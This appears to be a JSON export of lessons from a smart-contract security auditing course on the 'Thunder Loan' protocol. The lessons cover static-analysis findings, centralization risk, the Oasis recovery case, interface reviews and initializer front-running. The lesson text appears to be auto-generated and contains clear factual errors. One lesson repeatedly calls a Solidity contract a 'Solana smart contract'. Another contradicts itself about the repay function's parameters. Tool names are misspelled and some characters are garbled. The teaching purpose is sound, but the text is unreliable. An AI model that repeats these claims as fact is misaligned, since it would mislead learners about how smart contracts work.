don't muddle our results with data from libraries.\n\n## The Bug Hunt Begins\n\nOn initiating Slither, we did hit something noteworthy, a bug! The first info detected was thunderloan update. The problem lay in that the action of the code `s_flashloan fee = new fee` was not triggering an event emission. This was in Thunder Loan line 269.\n\nNow, let's get to the heart of the update flash loan fee function. We spotted a `s_flashloan fee` variable. When we investigated further, it was found to be a storage variable.\n\n> Important: Whenever a storage update occurs, it is mandatory to emit an event.\n\nTo make a note of it for the auditor, we wrote `@audit: low must emit an event.`But that's not the end of it. We found more issues with Slither.\n\n## Fishy Thunderloan\n\nSlither also pointed out the possibility of reentrancy vulnerabilities in the Thunderloan flash loan because of external calls being made. We're not entirely sure of the severity, but we mark these for a follow-up review.\n\n> Note: Be sure to check out the mentioned lines (#204, #181) in Thunderloan for potential reentrancy vulnerabilities.\n\n## Beware the Old Yellow\n\nFinally, Slither pointed out a yellow alert, which was a little concerning. The problem was that the return value of an external call was not stored in a local or state variable. Again, we must make a follow-up note of this and verify later if it's a grave issue.\n\nWith the last yellow alert, we've run through all theing that Slither had to offer. However, we're still not done. Next, we need to run Aderyn.\n\n## Round Two: Aderyn\n\nAfter running Aderyn, a report is generated. The report can be checked for any potential issues and, if need be, compared with Slither's findings.\n\nAnd voila, that's how you navigate through a Solidity project with the help of Slither and Aderyn. By doing so, you can identify potential vulnerabilities and build better, safer code. Until next time, happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "bd391a8a-f18f-496a-94de-1b82c42ed12b",
          "number": 12,
          "title": "Exploit: Centralization",
          "slug": "exploit-centralization",
          "folderName": "12-exploit-centralization",
          "description": "",
          "duration": 3,
          "videoUrl": "agXO01DKEutJjgPTKyucKjWI01KGYiXven4cJg8gPNKwo",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/12-exploit-centralization/+page.md",
          "markdownContent": "---\ntitle: Exploit Centralization\n---\n\n\n\n---\n\n---\n\n# **Understanding Centralization Risk in Contracts**\n\nIf you've written code for a smart contract, you may have come across this pesky medium-issue termed the 'centralization risk.' Often underplayed or regarded as a known non-issue, centralization risk holds the highly explosive capability to compromise your entire protocol.\n\n![](https://cdn.videotap.com/RLVhl7xtB45C5923CMwb-29.14.png)\n\nIn this article, we will dissect this concept, characterized by contracts with privileged owners who exercise undue rights to perform administrative tasks. These individuals demand a blind trust not to execute malicious updates or drain funds - a colossal deal in the world of protocols.\n\nBut, why should we report this in a private audit? Let's zoom in.\n\n## **Why Centralization Risk Matters**\n\nThe alarm bells around centralization risks are not just blown for fun. There are hundreds of thousands of reasons to do so, primary being the inherent security issue. This vulnerability, if left unaddressed, can lead to the disastrous situation known as a 'rug pull.'\n\nA metaphorical term, rug pull equates to the unanticipated withdrawal of liquidity from a protocol by its creators, rendering the protocol useless. Here's a quote aptly encapsulating this scenario:\n\n> \"Imagine someone pulling the rug off underneath your feet leaving you in a freefall. That's what is a rug pull.\"\n\nTake a case wherein a contract is deployed, and it's vaunted as a decentralized entity. But the reality behind it is that itâ€™s actually behind a proxy. At any unpredictable time, the owners of this proxy could upgrade the contract, introducing functions like 'steal all the money' - definitely not cool.\n\n## **A Deep Dive into SC Exploits Minimize Git Repo**\n\nIn the SC exploits minimize git repo associated with this course, we have chosen the SRC protocol's 'Thunder Loan.' We discovered that the protocol is rife with ownable actions. After sorting through 'Only Owner,' we spotted the functions set to allowed token, update Flash loan fee, and authorize Upgrade - all were exclusive to the owner.\n\nAdditionally, the owner of the protocol holds the power to modify all functionalities as per whims and fancies. This ownership is possible since the protocol is set behind a UUPS Proxy contract. It means that with one misstep, the entire protocol can be swept away.\n\nIt's not all bleak, though. Automated discovery tools like Adarin automatically seek centralization issues and generate comprehensive reports, minimizing the manual effort required to spot these vulnerabilities.\n\n## **Exploring Further: Case Study of Oasis**\n\nBefore we wrap up, let's undertake a brief study of an excellent DeFi vulnerability challenge based on Oasis. The purpose of this exercise is to delve into the insecurities laid bare by unchecked centralization.\n\nOur study highlighted that the contract owner could arbitrarily alter the balances of its users, effectively empowering the owner to rob the hard-earned ETH of its users. Consequently, this amplifies the centralization issue exponentially. This scenario mirrors an array of rug pulls stemmed from unchecked centralization.\n\n## **Conclusion**\n\nIn the end, it all boils down to one fact - the presence of centralization poses a severe risk to the security of any protocol. Being proactive in acknowledging and mitigating this risk is non-negotiable if we aim to maintain the integrity of our protocols. Centralization can be a security issue, but with constant vigil, we can tackle it head-on.\n\nStay safe and happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "dbe192e5-2438-42f5-a9f8-efac77de2cde",
          "number": 13,
          "title": "Case Study: Oasis",
          "slug": "case-study-oasis",
          "folderName": "13-case-study-oasis",
          "description": "",
          "duration": 3,
          "videoUrl": "01tl9ytnUSHzqH9WFKMKAhEnguCvd02E02EChawvxRlLsU",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/13-case-study-oasis/+page.md",
          "markdownContent": "---\ntitle: Centralization Case Study Oasis\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n# The Oasis Protocol Hack Recovery: A Tale of Centralization Risks and Court-Mandated Exploits\n\nYou have heard before about cyber thefts. But have you heard of one where hackers end up having the tables turned on them? This exactly happened earlier this year in the world of digital asset lending and borrowing. It's a rollercoaster of a story that involves smart contracts, the UK courts, and a protocol called Oasis. The protocol, incidentally, had projected itself as decentralized and permissionless, but ended up playing an ironic role. Let's dig in.\n\n## Oasis and Its Security Meltdown\n\nOasis is a digital platform that allows users to lend and borrow assets on the maker protocol. The exciting - and somewhat controversial - thing about it was its selling point as a decentralized and permissionless platform. In other words, there was no need for central intermediaries, fuss over permissions, or concerns about third-party interventions.\n\n![](https://cdn.videotap.com/TrlvVL07HW0fU9JmwRSw-26.17.png)\n\nAll well and good until one day when a hacker sneaked in and made off with a sizeable amount of money - exactly 120K wrapped ether. Placing his stolen money in the Oasis application, the hacker probably felt quite pleased with himself. However, he didn't count on the steps that the victims of this hack would take next.\n\n## Hacking Back the Hackers\n\nUnderstandably angered, the victims - who had substantial money sitting in the said protocol - turned to security researchers for assistance. The question was straightforward: Could a forced smart contract upgrade retrieve the stolen loot? To their relief, the answer was also straightforward: Yes.\n\nSo next, they went to court armed with this new knowledge of an exploit in the Oasis' codebase. Their request was straightforward: Force the team behind Oasis to upgrade the protocol and utilize the exploit to match the hacker's play. Sounds wild, right? But it didn't just end there.\n\n## A Court-Ordered Exploit\n\nThe court agreed with these victims and ordered Oasis - yes, the same Oasis that professed decentralization and permissionless transactions - to upgrade their protocol and exploit their own security flaw. The objective was clear: retrieve the hacked funds, which, in essence, was hacking the hacker.\n\n> \"The whole saga entailed coordination between the Oasis' founding team and the wormhole developer from Jump Crypto, the trading firm that had lost their money in the first place.\" - Extract from Blockworks Research Article.\n\nThis was possible only because Oasisâ€™s protocol wasn't truly decentralized or censorship-resistant. Had it been so, this court-ordered exploit couldn't have happened at all.\n\n## The Conundrum of Centralization\n\nSo was this a happy ending? Not everyone agrees. Yes, the stolen funds were recovered, but the image of Oasis as a truly decentralized platform took a hit. It revealed centralization risks creating a shift in how users see and interact with these types of platforms, as, generally, they are under the impression of these protocols being completely decentralized. As security researchers, we need to address such misleading aspects.\n\nPerhaps the takeaway from this episode is the importance of awareness and the possible loop-holes that may exist even in the most secure looking digital assets systems, and also that, despite the convenience and freedom, decentralized platforms can pose, there are hidden pitfalls.\n\nSo the next time you're looking into using a new system or protocol, remember the story of the Oasis Protocol Hack Recovery. Not every 'decentralized' platform is truly what it claims to be. Be sure to read the information given, especially when it comes to security and understand the risks before committing your digital or physical assets. Be aware, and make a well-informed decision.\n\nStay safe!\n",
          "updates": []
        },
        {
          "lessonId": "2d1c0adc-43ec-4577-8da5-e47ba2915f66",
          "number": 14,
          "title": "Static Analysis Continued",
          "slug": "static-analysis-continued",
          "folderName": "14-static-analysis-continued",
          "description": "",
          "duration": 3,
          "videoUrl": "33fYTX8nWMzZ4ht4z9m00qfx9ogYtjL14J13bhZJtlv8",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/14-static-analysis-continued/+page.md",
          "markdownContent": "---\ntitle: Static Analysis Continued\n---\n\n\n\n---\n\n# Identifying Key Aspects of a Blockchain Protocol Audit\n\nThe process of a blockchain protocol audit involves numerous steps, including checking for null address errors or unused functions, and then reporting these findings. In this blog post, we will go through the transcript of such an audit, explaining the key steps and the reasons behind the auditors' actions.\n\n## Addressing Null or Zero Address Errors\n\nThe first thing on the agenda was identifying any zero address checks that were missing.\n\nWhile inspecting the code in `orible_upgradable.sol`, few aspects came to light that called for some auditing. In blockchain parlance, a zero address refers to an address that was never assigned. If any state variables in a smart contract were unintentionally assigned to a zero address, the contract may not function as intended.\n\nThe code seemed to have a couple of places where this was an issue in assigning values to address state variables that lacked checks for address zero.\n\nAn additional instance required our attention, further validating that multiple aspects of this contract require zero address checks. This recommendation came up as part of the audit's Informational findings or the 'Gas' that helps improve the contract's architecture.\n\n## Marking Unused Functions as External\n\nThe next point of attention was for functions that werenâ€™t being used internally. These could be marked as external. Specifically, the `getAssetToken` function appeared to be a likely candidate for this change. It was found to be defined in `ThunderLoan.sol` but seemed to only be utilized in the `ThunderLoanUpgraded.sol` contract.\n\n## Defining and Using Constants Instead of Literals\n\nLiterals, in coding terms, are the set values that remain unaltered throughout the code's execution. Using constant variables instead of these literals enhance the codeâ€™s readability and maintainability.\n\nOn Line 144 of the contract, the use of magic numbers was spotted. Magic numbers refer to undisguised numerical values that could potentially create confusion in the future. Therefore, defining and using constants instead of these literals is strongly advised.\n\n## Track Missing Index Fields in Events\n\nEvents play a crucial role in smart contracts, keeping a log of essential occurrences. Therefore, including an 'index field' is essential, as it aids in filtering and searching event logs effectively.\n\nIn our project's case, some events being emitted lacked such an indexed field. Including this in the final report as an informational finding is a must, enabling the team to use events in a more structured and practical manner.\n\n# Evaluating Centralization Issue\n\nDuring our audit process, a centralization issue was identified with the protocol. It's a common practice in a private audit to notify the protocol if the contract is centralized. As highlighted in the Oasis case, an element of control or flexibility can potentially have dire consequences on protocol decentralization.\n\n\"We found a centralization issue. We'd generally advise against this if the protocol doesn't need to be ownable or upgradable, as it presents a centralization vector.\"\n\n# Concluding Remarks\n\nInformation gleaned from this audit demonstrates how intricately the process needs to be conducted. Key findings drawn during the process included missing zero-address checks, unused internal functions, usage of literals instead of constants, and missing index fields in events. Along with this, an important aspect brought forth was the issue related to centralization.\n\nIt's vital to consider every possible attack vector when developing a protocol. By acknowledging potential risks, such as an unsuspecting bad actor gaining control and pilfering funds, we can make necessary adjustments to mitigate these risks.\n\nBy running various audits like Slither or Adarin, we can close potential loopholes and aim to deliver a more streamlined, safe, and reliable protocol. These measures culminate in securing your protocol's integrity against potential risks, enhancing its potential for real-world utilization.\n",
          "updates": []
        },
        {
          "lessonId": "eff20578-d301-44a4-9a97-57140f7e19b5",
          "number": 15,
          "title": "Recon IPoolFactory",
          "slug": "recon-ipoolfactory",
          "folderName": "15-recon-ipoolfactory",
          "description": "",
          "duration": 6,
          "videoUrl": "5d100hkLtDwSGLk4ibstw700fikz1RQ4T00c8Bj31rHfOA",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/15-recon-ipoolfactory/+page.md",
          "markdownContent": "---\ntitle: Recon Manual Review IPoolFactory sol\n---\n\n\n\n---\n\n# Manual Code Review: Getting Started\n\nAfter setting our initial context and utilizing our suite of auditing tools, it's time to get our hands dirty with some thorough manual review. Much like our previous auditing process, one viable option available to us is to start from the test suite.\n\n## Diving Into the Test Suites\n\nThe project at hand features an invariant test suite, which, unfortunately, is rather redundant, hence ineffective. Additionally, there are some unit tests that warrant our attention. Consequently, an excellent first step is to run the `forge coverage` command to get an idea of the current test suite under scrutiny.\n\n## Reviewing Test Coverage\n\nOur preliminary exploration reveals that the test coverage is unsatisfactory. Therefore, it's mute to map out our plan of action: We need to scrutinize this test suite, comprehend its shortcomings, infer the invariants, and consequently pen a robust invariant test suite. Afterward, all related findings would be relayed to the clientâ€”highlighting their dire need to improve test coverage, expressed as an informal suggestion.\n\nOur last venture had us initially peering into their test suite and buffing it up. By taking this approach, revealing the hidden bugs was a breeze, and it seems likely that this strategy would prove beneficial once more. Nevertheless, this journey would also incorporate a thorough manual review.\n\n## Focus on Proof of Code\n\nAn essential part of the auditing process would involve digging deep into the provided code with a fine-toothed comb. While no single approach guarantees success, we'll be implementing the 'Tincho method' with considerably more gravity this time around.\n\n### Workflow Setup with the Tincho Method\n\nOur journey begins in the SRC, using the `solidity metrics` command. The output would be copied in entirety and pasted into a document of choice. I personally prefer Google Sheets due to its easy to use interface and sorting abilities.\n\n![](https://cdn.videotap.com/UrVcjpzYpZgiEY4KluYE-96.32.png)\n\nAfter eliminating any unnecessary columns, it is sensible to sort the code by size, in ascending order. This list forms the foundation of our audit, providing a linear path of progression from smaller contracts to larger ones.\n\n### Mining the Code: Ifactory sol and ipoolfactory sol\n\nUsing the Tincho method, we start by tackling the smallest contract: 'ifactory.sol'. The microscopic size may make it seem insignificant, but give it due diligence.\n\nShortly after, 'ipoolfactory.sol' comes under scrutinyâ€”the first contract addressed in this session. Notably, this contract seems to interface with the T swap pool factory, as signified by the function 'get pool'.\n\nOn closer inspection of the TSWAP code base, we can see that there is indeed a 'get pool' function present in the 'pool factory' ('poolfactory.sol').\n\nA useful annotation to consider:\n\n> 'ipoolfactory' is likely the interface used for communication with 'poolfactory.sol' from TSWAP.\n\nIt would be beneficial to jot down these insights as an organized mind note or Google Sheets document, with sections such as 'About', 'Potential attack vectors', 'Ideas', and 'Questions'.\n\nA few starting points include:\n\n- Write about the protocol in your own words.\n- Why are we using TSWAP in this context?\n- How do flash loans correlate with this usage of TSWAP?\n\nThis document acts as a brain dump, helping record initial thoughts, insights, and potential attack vectors. Maintaining an organized note system would likely make your work more efficient.\n\nAt first glance, 'ifactory.sol' seems sound without any evident issues, which is a good sign. This quick win aligns with our ideology: to confirm the validity of the smaller parts before progressing onto larger sections.\n\n## Keeping An Audit Trail\n\nEvery reviewed snippet is ticked off, allowing us to keep track of our journey and ensure that ground covered is not tread twice.\n\nOur first milestone? 'ipoolfactory.sol': reviewed successfully.\n\nTo improve our workflow, we could even factor in stages of review ('first pass', 'second pass', etc.). Our current initiative involves only a single comprehensive review to keep things simple.\n\n## Wrapping It Up: First Review\n\nAfter this successful review of 'ipoolfactory.sol', we realise that the audited code interacts with an external contract: the pool factory. By understanding these relationships and ensuring the correctness of the smaller contracts, we're paving the way to a comprehensive project audit. Armed with keen eyes and perseverance, we're ready for our next taskâ€”be it large or small.\n",
          "updates": []
        },
        {
          "lessonId": "b749f8e0-87f5-4e12-880d-8ecd81d5871b",
          "number": 16,
          "title": "ITSwapPool",
          "slug": "itswappool",
          "folderName": "16-itswappool",
          "description": "",
          "duration": 2,
          "videoUrl": "Sgp1kQyHpxrzWfP6dsnvyYG72fZN02tFxUwMU00D8Dd5A",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/16-itswappool/+page.md",
          "markdownContent": "---\ntitle: ITSwapPool sol\n---\n\n\n\n---\n\n# Deep Dive into Tswappool.sol Interface\n\nOne mystery that never loses its charm in the world of programming is the magic and intrigue of code reviews. It's an opportunity to navigate a labyrinth of ideas coded into existence, where the treasure isn't a particular conclusion, but a drive towards understanding and well, continuous improvement. In our expedition today, we're exploring the exciting realm of \"Tswappool.sol\".\n\n## The Intriguing Interface of TSwapPool\n\nAs we pulled up the \"Tswappool.sol\" file, it quickly became clear that the script was another interface in the ever-expansive Ethereum world, and the initial overview was rather promising.\n\nHere's a quick view into the key aspects of this interface:\n\n- `SPDX license Identifier`: Check. Good on this front.\n- `Pragma solidity`: All clear here.\n- `Interface TswapPool`: The main piece we're interested in.\n\nThe structure and organization of the script were clean, effective, and up to standards at first glance, which adds a tick on the checklist.\n\n### The Key Function: Get Price of One Pool Token in WETH\n\nThe heart of any interface lies within the crucial functions it employs. In TswapPool, we uncover a singular but significant function - `getPriceOfOneTokenInWETH`.\n\n![](https://cdn.videotap.com/AVRQTYRhhg4lDMb4rQM4-43.2.png)\n\nUsing this function, the interface ends up working with TSWAP quite seamlessly. So kudos on the smart use of simplicity guided by functionality!\n\n#### But Why Only One Function?\n\nWhile everything else falls perfectly into place, a peculiar aspect emerges. The existence of only one function in the interface raises the question, \"Why is the price of pool token in WETH the solitary functionality being implemented here?\"\n\n> \"Why is the `getPriceOfOneTokenInWETH` function the only one in this interface?\"\n\nThis question remains open-ended for now and forms an essential part of understanding and further exploring the purpose and design of this interface.\n\n## It's a Check!\n\nMinus the above question, scrutinizing the 'Tswappool.sol' interface looks predominantly positive. Both the syntax and architecture of the coded script meet the expected standards.\n\nLiving up to the 'Tincho method' philosophy, which advocates for the clarity and optimization of code, the TswapPool interface easily garners a big shiny check âœ“!\n\nIndeed, code reviews especially with the Tincho method in our toolkit, feel deeply satisfying when met with such well-structured and cleanly scripted interfaces.\n\nAs we come to the end of our review, remember that understanding scripts isn't just about putting checks on a list, but about appreciating the complexity coded into simplicity and the team spirit built into community standards.\n\nReviewing the `Tswappool.sol` interface was a pleasure. Here's to many more engaging dives into the intriguing world of Ethereum and blockchain development!\n",
          "updates": []
        },
        {
          "lessonId": "2fd9c1c0-5353-4d44-acd7-c33062f816e2",
          "number": 17,
          "title": "IThunderLoan",
          "slug": "ithunderloan",
          "folderName": "17-ithunderloan",
          "description": "",
          "duration": 3,
          "videoUrl": "33VDcKF5DO2IS6By1z0100S017z99vM3DkWaEuH747NflI",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/17-ithunderloan/+page.md",
          "markdownContent": "---\ntitle: IthunderLoan.sol\n---\n\n\n\n---\n\n# Unearthing Bugs and Enhancing Interfacing in ThunderLoan Protocol\n\nIn the overlapping maze of smart contracts and blockchain protocols, it's critical not to miss any threads. You can uncover this through a methodical analysis of the mechanism layer by layer, as demonstrated with ThunderLoan protocol.\n\n## Unraveling the ThunderLoan Contract\n\nThe journey begins with taking a peek at the IThunderLoan interface we have been investigating. Here, the classic `ThunderLoan` contract caught my eye. As the usual procedure goes, we need to tackle a crucial question â€“ \"Does `ThunderLoan` implement the `IThunderLoan`?\"\n\nIn this case, the `ThunderLoan` contract doesn't implement `IThunderLoan`. This might seem odd at first, but it could perhaps be an informational point from an auditing perspective. Intriguingly, the `IThunderLoan` interface should ideally be carried out by the `ThunderLoan` contract. An interface is a valuable tool in programming, it acts as a guideline to developers, ensuring that they donâ€™t leave out any critical functions.\n\nNow, if the contract isn't implementing the interface, it's time to delve deeper into the details and discrepancies that might crop up in such cases. Let's compare the two closely and see if they're actually different.\n\n![](https://cdn.videotap.com/Bft86JEs1cIqjxRo4BZq-39.92.png)## Scrutinizing the Repay Function\n\nKeeping a sharp focus on the `repay` function, we can see that it accepts a token, an address, and an amount. If we dig into the `IThunderLoan` interface, we notice this function takes an `IERC20` token and an address amount.\n\nUpon a detailed observation, this presents a peculiar situation â€“ the `IThunderLoan` and `ThunderLoan` contract parameters are not only different, but they contradict each other, creating grounds for an issue. Just imagine scenarios where the `repay` function is expecting an `IERC20` token, but it receives an address token; the resulting confusion could cause the process to break!\n\nNow, when we try to import the `IThunderLoan` and inherit it into `ThunderLoan` in Visual Studio Code, and if we save it, it says _\"ThunderLoan should be marked abstract because it doesn't implement this `repay` function.\"_ This issue would have been caught easily if best practices had been followed and the auditing information had been put into use.\n\nFurther, when the forge build is actioned, it doesnâ€™t compile. This draws our attention back to the different parameters of the `repay` function.\n\n> \"Stacking up both the interfaces side by side, in the `ThunderLoan` contract, the `repay` function is clutching an `IERC20` token and a `uint256`, whereas its counterpart â€“ `IThunderLoan` is nesting an address token and an amount.\"\n\nThis makes it clear that these two are not singing in harmony, creating the need for amendments where necessary.\n\nABOUT THE AUTHOR: This auditing journey showcases the significance of in-depth code investigation in contracts and interfaces. It provides insights into the potential complexities that might arise in coding and software development. Itâ€™s a concrete reminder of how seemingly insignificant details can crop up to create considerable confusion in function implementation and can carry far-reaching consequences if overlooked â€“ prominently, in smart contracts and blockchain protocols.\n\n### Unraveling Code Rubrics, One Function at a Time\n\nIt's time to retract the changes made and run some `command z's` to restore the code. Here lies an opportunity to leave a note to remind that the referenced interface should be implemented. This attention to detail can be tagged as either low or informational. These tags would depend on the possible future risks; it would probably be informational if the address token doesn't pose much of an issue. But itâ€™s definitely something that demands further investigation.\n\nIn essence, itâ€™s crucial that accurate information is included in the report. So what at first glance looked like an odd piece of code, presented us with a whole other issue to dive into, and that's another feather in our problem-solving cap!\n\nThrough this auditing adventure, we were able to uncover multiple discrepancies and enhance uniformity in the interfacing processes.\n\nLetâ€™s keep this journey of code analysis ongoing - one function, one issue at a time. We may find the codebase exhausting at times, but as we unravel the layers, it's definitely rewarding for the meticulous code investigator.\n",
          "updates": []
        },
        {
          "lessonId": "3f456769-0a89-4ae3-983f-f881a20e3d44",
          "number": 18,
          "title": "IFlashloanReceiver",
          "slug": "flashloan-receiver",
          "folderName": "18-flashloan-receiver",
          "description": "",
          "duration": 7,
          "videoUrl": "dpk00F5e5kJZmDdKrppCF1j9jyxzvx6SFe7J001M01oPRI",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/18-flashloan-receiver/+page.md",
          "markdownContent": "---\ntitle: IFLashLoanReceiver.sol\n---\n\n\n\n---\n\n# Deep diving into Flash Loan Audits\n\nGoing through audits especially when it involves assert checking can be a bit of a challenge even for seasoned programmers. Today, we will be looking into **IFlash Loan Receiver** contracts, finding out potential loopholes and code clean ups that we can perform to ensure our contract is as secure and tight-knit as possible.\n\n![](https://cdn.videotap.com/nmh2iNPnadGsdWNfaTx7-13.81.png)## Understanding the Flash Loan receiver contracts\n\nA quick look at our code shows that we use a lot of import statements like `import IThunderLoan from ../IThunderLoan`. Now it might seem okay to import libraries and classes that we might not really use directly in our codebase, but there's reason to trim down on that. Let's delve in.\n\nWhile this line of code might seem harmless initially, closer inspection reveals that we don't really need to import this. Why is it there? One may think there could be an underpinning connection by another class or component. So let's try to find out where exactly this particular import is being utilized.\n\nUsing the handy keyboard shortcut **Command Shift F** (or Control Shift F for Windows) in Visual Studio, we can quickly locate where `IFlashLoanReceiver` file is and where `IThunderLoan` is being imported.\n\nTo our surprise, we found out that `IThunderLoan` isn't imported or used anywhere in the `IFlashLoanReceiver`. So it begs the question, why is it there?\n\n## Cleaning Up Unused Imports\n\nWhile it's tempting to leave unused imports like this in your code (who knows, you might need it later, right?), this could be seen as bad practice in general. This is largely because it makes the code harder to read and understand, especially for new people coming onto the project and also, it could introduce potential security risks.\n\nWe went ahead to comment out the `IThunderLoan` import to see if anything breaks. Running `forge build` in the terminal, we confirmed that, indeed, we didn't actually need this import.\n\n> **Note:** It's a fundamental principle of smart contract engineering to avoid altering live codes for test mocks. Hence we need to remove the import from `MockLoanReceiver.sol`.\n\nAfter removing the redundant import, our build is still in great shape, and we've made our project slightly cleaner and easier to understand.\n\n## Exploring Flash Loan mechanics with Aave\n\nWith the code cleaned up, we now shift focus to understanding some foundational concepts. Looking at the Flash Loan receiver contracts available on [Aave](https://github.com/aave), we realize that the implementation here is somewhat similar to what we have in our own codebase. The perfect opportunity to learn!\n\nHere's a snippet of the Aave code we were going through:\n\n```js\nfunction executeOperation(address _reserve,uint256 _amount,uint256 _fee,bytes memory _params)external returns (bool);\n```\n\nThis part of the code piqued our curiosity. We came up with some assumptions about what each parameter might be doing:\n\n- `_reserve` could be the token being borrowed.\n- `_amount` probably is the amount of tokens.\n- `_fee` seems like it could be the fee of the Flash loan protocol.\n- `_params` could likely be the callback function.\n\nAt this point, the code isn't elaborating on what these parameters are doing (a big shoutout to @audit for the Nat spec!), so we will need to do some more digging to find out.\n\n> **Quote:** \"A big part of becoming proficient in contract auditing involves making well-educated guesses and then verifying those guesses.\"\n\nAs we are going through the process, we find that the `executeOperation` is implemented in the `ThunderLoan.sol` which on running looks sufficiently secure.\n\n## Wrapping Up and Taking Breaks\n\nWith this deeper understanding, we actually managed to find some informationals that we can pass on to our client - which, at the end of the day is what it's all about: making the protocol safer, more successful, and better. And let's not forget, adhering to best practices in engineering.\n\nDuring this audit process, don't forget to take breaks! Applying the Pomodoro technique helps maintain focus, where one works for about 50 minutes and then takes a break for 5-10 minutes.\n\n**And there you have it, folks! Remember, keep your code clean, follow good engineering practices, and always, always remember to question everything. Happy auditing!**\n",
          "updates": []
        },
        {
          "lessonId": "40862597-8a81-4c01-b2a7-8a316236b940",
          "number": 19,
          "title": "OracleUpgradeable",
          "slug": "oracle-upgradeable",
          "folderName": "19-oracle-upgradeable",
          "description": "",
          "duration": 5,
          "videoUrl": "dScx48n2ImjtOfzadSAaazduEiHd00WBV5dyXUAJMLho",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/19-oracle-upgradeable/+page.md",
          "markdownContent": "---\ntitle: OracleUpgradeable.sol\n---\n\n\n\n---\n\n# Understanding the Tincho Method: A Deep Dive into Solana Smart Contract\n\nIn our previous discussion, we were introduced to the Tincho method. Thanks to its creator, Tincho, it gave us more confidence in creating our first Solana smart contract. Now, let's dive deeper into this journey and breakdown the necessities of preparing a Solana smart contract with a hand on codebase.\n\n## A Look at the Codebase\n\nFirst, navigate to the Solana `.sol` file. It's our initial contract. It may seem small, but it's our first step into the universe of smart contracts. So let's explore what its components are. If you are not familiar with Solana or `.sol` files, you may find it easier to use 'Word Wrap' function to easily view the code.\n\nWith the 'Word Wrap' enabled, we can see some keywords like `pragma` and `solidity`. There are also several imports, such as `it swap pool`, `Ipool factory`, and `initializable` which are being used within the same contract.\n\n## The Role of Initializable\n\nNow, let's take a more in-depth look at the `initializable` package. It originates from OpenZeppelin, more specifically `OpenZeppelin contracts Upgradable`. As the name suggests, it aids in writing upgradable contracts and will be crucial to our understanding due to its role in proxy elements.\n\n> OpenZeppelin's `initializable` package plays a significant role in Solana smart contract creation. It makes it possible to construct complex contracts that are easily managed and upgradable. It is imperative to understand its functionality and how it interacts with other elements in the smart contract.\n\n## Understanding Proxy in Solidity\n\nNow, let's navigate our way to Thunderloan.sol contract. Here, we will come across `Oracle Upgradable`, which is inherited into the main Thunderloan contract.\n\nThe `Oracle Upgradable` contract is a part of the main `Thunderloan` contract. It's a base contract facilitating upgradable contracts or contracts deployed behind a proxy. To get more comfortable with this concept, it's important to understand proxies and their use in Solidity.\n\nIf you take a look at the Nat spec (Natural Specification), you'll learn that upgradable contracts can't have constructors. The reason is, in an upgradable contract the storage is delegated to the proxy, but the logic resides in the implementation.\n\nHere is an important takeaway:\n\n> A contract's storage variables live in the proxy contract, while the contract logic lives in the implementation contract. Therefore, making use of constructors to initialize storage variables isn't applicable.\n\nIn order to circumvent this issue, the `initializable` contract comes into play. Instead of constructors, you have initializer functions that help initialize proxies with storage. For instance, in OpenZeppelin contracts, you will find initializer functions signified as `__Init` and `__Initunchained`.\n\n## Decoding Oracle Init\n\nNext, we have `Oracle Init` which is our initializer. It calls `Oracle Init Unchained` that takes a `pool factory address`, a `TSWAP address`, and another `pool factory address`.\n\nOur initializer function, `Oracle Init`, calls another function, `Oracle Init Unchained`. This function has a parameter `only initializing` which restricts the function to be called only one time.\n\n(Here's a piece of convention information: I suggest changing the name `TSWAP address` to `pool factory address` for better consistency. Just something to note if you are auditing the contract.)\n\nIn simple terms, the entire setup here is to initialize the contract's state because we are using a proxy model where a constructor is not applicable. Now that we've successfully dived into the codebase and demystified key concepts, our Solana smart contract is ready for deployment!\n",
          "updates": []
        },
        {
          "lessonId": "4c23d2c2-a3c7-4303-b5a7-7e0736abb8df",
          "number": 20,
          "title": "Exploit: Failure To Initialize",
          "slug": "failure-to-initialize",
          "folderName": "20-failure-to-initialize",
          "description": "",
          "duration": 3,
          "videoUrl": "PBPuXLJ6QH7F75S7iVFz6FqctiT2TTVhE3TxkePo3fE",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/20-failure-to-initialize/+page.md",
          "markdownContent": "---\ntitle: Exploit - Failure to Initialize\n---\n\n\n\n---\n\n# Unmasking a Major Pitfall in Smart Contracts: Initialization Vulnerability\n\nHello code enthusiasts and blockchain fans! Today, I want to share with you my recent findings while perusing the Thunderloan smart contract. For the uninitiated, smart contracts are self-executing contracts that live on the blockchain. They are primarily used to enforce agreed-upon rules without requiring the presence of third parties.\n\n## The Constructor in Smart Contracts\n\nLet's delve into a peculiar problem I've observed multiple times - particularly concerning initializers. As someone who has been doing this for quite a while, I've developed an instinct for catching certain risks. While examining Thunderloan's `initialize()` function, I knew I had stumbled upon an interesting issue.\n\n![](https://cdn.videotap.com/OpjaMfHKQ2Zje0pNKhzI-13.95.png)\n\nLet's break down what an `initializer` is. This method is essentially replacing the traditional contract `constructor` as a setup function in contracts. It serves to initialize contract parameters when the contract is deployed.\n\n## The Vulnerability: Front-running Initializers\n\nWhat could possibly go wrong with this, you may wonder? I'd like to pose a question: What if we deploy a contract and someone else gets to initialize it before we do? In other words, what if another person jumps the queue and sets the essential contract parameters prior to our initialization?\n\nThis is akin to someone else picking up your rental car and setting the GPS addresses before you even get the keys!\n\nTaking this potential scenario into consideration, it becomes clear why 'initializers being front-run' have often been flagged in audits as low-risk vulnerabilities.\n\n```\naudit('low', 'initializers can be front run');\n```\n\nImagine you have deployed a contract and forgotten to call the `initialize()` function. The scammer in our scenario notices this, exploits the vulnerability, and changes the `TSWAP` (Token Swap) address before you. The entire contract ends up being skewed towards this malicious user's benefit.\n\n## The Result of the Attack\n\nSo, what happens to the contract we just deployed? If the contract hasn't been initialized, it will likely malfunction or fail to work as smoothly as intended.\n\nFor instance, within the Thunderloan contract, if the `SPoolFactory` (smart pool factory) is not initialized, the `getPrice()`, and `WETH()` function calls may instead invoke the Ethereum null address, leading to unexpected behavior.\n\n```\nif (!initialized) {getPrice() --> address(0)WETH() --> address(0)}\n```\n\nThis scenario emphasizes the critical importance of ensuring initialization. Without it, the protocol ends up under-performing or in worse 